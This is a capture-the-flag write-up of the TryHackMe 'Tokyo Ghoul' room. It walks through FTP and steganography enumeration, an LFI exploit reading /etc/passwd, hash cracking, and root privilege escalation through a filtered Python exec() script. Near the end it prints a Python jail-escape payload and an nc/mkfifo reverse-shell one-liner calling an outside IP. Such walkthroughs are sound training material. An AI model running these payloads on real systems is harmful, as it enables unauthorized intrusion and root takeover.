## Enumeration

Starting off with rustscan to quickly scan all ports

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/1.png">

Performing a full scan with nmap on those ports

```

I added the target IP to my /etc/hosts as ghoul.thm so i won't have to type the IP all the time

### FTP

Starting my poking around on ftp port 21 since anonymous login is available and nmap showed an intersting file present

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/3.png">

Looking further into the files i find need_to_talk to be an executable. I ran it and got some useful information back. I used rabin2 to read the strings from the data section and found what was likely to be the passphrase

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/3-1.png">

After getting the ‚Äúpassphrase‚Äù I decided to try it to extract data from the image i got from the ftp. I ended up with dots and dashes, so morse code, and went to my trusty chef to cook up something

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/4.png">

After tweaking the recipe I got what was surely a hidden directory

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/5.png">

### HTTP

Looking at the source for http://ghoul.thm I see a hint about anonymous ftp login but I've already done that same hint in http://ghoul.thm/jasonroom.html
Going into the directory I found, I see clear instructions to scan it so it would be quite rude not to

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/6.png">

gobuster took it's time but returned something. i should have probably used ffuf instead

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/7.png">

## Exploitation

Going to page i find that the links have get parameters that could possibly be LFI exploitable

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/8.png">

Trying basic LFI payload of ../../../../../../etc/passwd returned a message of ‚Äúno no no silly don't do that‚Äù so i used ffuf to test various payloads and got a hit

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/9.png">

I used curl to get the contents and luckily also got a password hash for the user kamishiro

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/10.png">

Cracking the hash using hashcat i got the password for kamishiro and then logged in via ssh

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/11.png">

## Privilege Escalation

Upon logging in I ran "sudo -l" to see what sudo privileges the user had. I found that the user could execute a certain script as root
Checking the script it showed that it uses the ‚Äúexec()‚Äù function therefore it can execute user input. It does have some filters so i would have to use a payload that doesn't include any of those

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/12.png">

using the payload below i was able to bypass the ‚Äúpython sandbox/jail‚Äù

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cmd')
```
reference: [Escaping Python Jails](https://anee.me/escaping-python-jails-849c65cf306e)

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/13.png">

Using the payload below to get a reverse shell as root

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.169.153 4444 >/tmp/f')
```
